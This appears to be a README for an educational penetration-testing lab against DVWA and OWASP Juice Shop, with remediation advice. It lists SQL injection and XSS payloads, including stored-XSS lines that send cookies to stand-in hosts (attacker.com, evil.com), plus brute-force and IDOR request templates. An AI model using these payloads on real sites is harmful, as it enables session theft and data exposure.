# 🛡️ Web Application Security Testing Lab

> **VAPT (Vulnerability Assessment & Penetration Testing) on intentionally vulnerable applications — DVWA & OWASP Juice Shop**

![Security](https://img.shields.io/badge/Security-VAPT-red?style=for-the-badge)
![Tools](https://img.shields.io/badge/Tools-Burp%20Suite-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-green?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-blue?style=for-the-badge)

---

## 📌 Project Overview

This project documents a complete **Vulnerability Assessment and Penetration Testing (VAPT)** exercise performed on two intentionally vulnerable web applications:

- **DVWA** (Damn Vulnerable Web Application)
- **OWASP Juice Shop**

The goal was to identify, exploit, and document real-world web vulnerabilities including SQLi, XSS, broken authentication, and access control flaws — then produce structured security reports with remediation recommendations.

---

## 🎯 Objectives

- Perform manual and tool-assisted vulnerability assessment
- Identify OWASP Top 10 vulnerabilities in a controlled lab
- Use **Burp Suite** for request interception, manipulation, and payload crafting
- Document findings in a professional VAPT-style report

---

## 🔧 Tools & Technologies

| Tool | Purpose |
|------|---------|
| **Burp Suite Community** | Proxy, interceptor, repeater, intruder |
| **DVWA** | SQL Injection, XSS, CSRF, File Upload lab |
| **OWASP Juice Shop** | Broken auth, access control, sensitive data |
| **Kali Linux / Ubuntu** | Testing environment |
| **Firefox + FoxyProxy** | Proxy routing |
| **SQLMap** | Automated SQL injection testing |
| **curl / wget** | Manual endpoint testing |

---

## 🏗️ Lab Setup

### Prerequisites

```bash
# Option 1: Docker (Recommended)
docker pull webpwnized/mutillidae:latest
docker pull bkimminich/juice-shop

# Run DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Run OWASP Juice Shop
docker run --rm -p 3000:3000 bkimminich/juice-shop
```

### Burp Suite Configuration
1. Open Burp Suite → Proxy → Options
2. Set listener to `127.0.0.1:8080`
3. Configure Firefox to use proxy `127.0.0.1:8080`
4. Install Burp CA certificate in Firefox

---

## 🔍 Vulnerabilities Identified

### 1. SQL Injection (SQLi)

**Target:** DVWA — Login Form & Search  
**Severity:** 🔴 Critical  

**Payload used:**
```sql
' OR '1'='1' --
' UNION SELECT null, username, password FROM users --
admin'--
```

**Burp Suite Steps:**
1. Intercept login POST request
2. Send to Repeater
3. Inject payload in `username` parameter
4. Observe error-based / boolean-based response

**Evidence:** Returned full user table dump including hashed passwords.

---

### 2. Cross-Site Scripting (XSS)

**Target:** DVWA (Reflected & Stored), Juice Shop  
**Severity:** 🟠 High  

**Reflected XSS Payload:**
```html
<script>alert('XSS-Reflected')</script>
"><script>alert(document.cookie)</script>
```

**Stored XSS Payload (Comment field):**
```html
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

**DOM-based XSS:**
```javascript
javascript:alert(document.domain)
#<script>alert('DOM-XSS')</script>
```

---

### 3. Broken Authentication

**Target:** DVWA Login, Juice Shop Admin  
**Severity:** 🔴 Critical  

**Techniques Used:**
- Brute-force with Burp Intruder (Sniper attack)
- Default credentials: `admin:admin`, `admin:password`
- JWT token manipulation in Juice Shop
- Session token analysis (no HttpOnly / Secure flags)

**Burp Intruder Setup:**
```
POST /login HTTP/1.1
username=admin&password=§password§
```
Loaded with `rockyou.txt` wordlist subset.

---

### 4. Broken Access Control (IDOR)

**Target:** OWASP Juice Shop — User Profiles & Orders  
**Severity:** 🔴 Critical  

**Steps:**
1. Login as regular user
2. Access `/rest/user/whoami` → note user ID
3. Change ID in request: `/api/Users/1` → returned admin data
4. Access other users' orders by modifying order IDs

**Burp Repeater Request:**
```http
GET /api/Users/1 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <your_token>
```

---

### 5. Security Misconfiguration

**Target:** DVWA, Juice Shop  
**Severity:** 🟡 Medium  

**Findings:**
- Default admin credentials not changed
- Verbose error messages revealing stack traces
- Directory listing enabled
- Missing HTTP security headers (CSP, HSTS, X-Frame-Options)

---

## 📸 Screenshots

> Screenshots are located in the `/screenshots` folder.

| File | Description |
|------|-------------|
| `sqli-login-bypass.png` | SQL injection bypassing login |
| `sqli-union-dump.png` | UNION-based data extraction |
| `xss-reflected.png` | Reflected XSS alert popup |
| `xss-stored.png` | Stored XSS in comment field |
| `burp-intercept.png` | Burp Suite intercepted request |
| `burp-intruder.png` | Brute-force attack in Burp Intruder |
| `idor-user-data.png` | IDOR leaking other user's data |
| `broken-auth.png` | Broken authentication exploitation |

---

## 📋 Vulnerability Summary Table

| # | Vulnerability | Target | Severity | CVSS | Status |
|---|--------------|--------|----------|------|--------|
| 1 | SQL Injection | DVWA | Critical | 9.8 | ✅ Exploited |
| 2 | Reflected XSS | DVWA | High | 7.4 | ✅ Exploited |
| 3 | Stored XSS | DVWA / Juice Shop | High | 8.8 | ✅ Exploited |
| 4 | Broken Authentication | DVWA / Juice Shop | Critical | 9.1 | ✅ Exploited |
| 5 | IDOR / Broken Access Control | Juice Shop | Critical | 8.8 | ✅ Exploited |
| 6 | Security Misconfiguration | Both | Medium | 5.3 | ✅ Identified |
| 7 | Sensitive Data Exposure | Juice Shop | High | 7.5 | ✅ Identified |

---

## 🔧 Remediation Recommendations

### SQL Injection
- Use **parameterized queries / prepared statements**
- Implement **input validation and sanitization**
- Apply **least privilege** on DB accounts
- Use ORM frameworks (Hibernate, SQLAlchemy)

### XSS
- **Encode output** (HTML entity encoding)
- Implement **Content Security Policy (CSP)**
- Use `HttpOnly` and `Secure` cookie flags
- Validate and sanitize all user inputs

### Broken Authentication
- Implement **multi-factor authentication (MFA)**
- Use **account lockout** after failed attempts
- Enforce **strong password policies**
- Use **secure session management** (regenerate session IDs)

### Broken Access Control
- Implement **server-side authorization checks**
- Use **indirect object references** (UUIDs instead of sequential IDs)
- Apply **principle of least privilege**
- Log and monitor access control failures

---

## 📁 Project Structure

```
vapt-project/
├── README.md                    ← This file
├── reports/
│   ├── VAPT_Report_DVWA.md      ← Full DVWA report
│   ├── VAPT_Report_JuiceShop.md ← Full Juice Shop report
│   └── Executive_Summary.md     ← Executive summary
├── screenshots/
│   ├── sqli-login-bypass.png
│   ├── xss-reflected.png
│   ├── burp-intercept.png
│   └── ... (see /screenshots)
├── payloads/
│   ├── sqli_payloads.txt        ← SQLi payload wordlist
│   ├── xss_payloads.txt         ← XSS payload wordlist
│   └── auth_wordlist.txt        ← Auth brute-force list
└── scripts/
    ├── setup_lab.sh             ← Auto-setup script
    └── scan_headers.sh          ← HTTP header checker
```


## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [Juice Shop GitHub](https://github.com/juice-shop/juice-shop)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

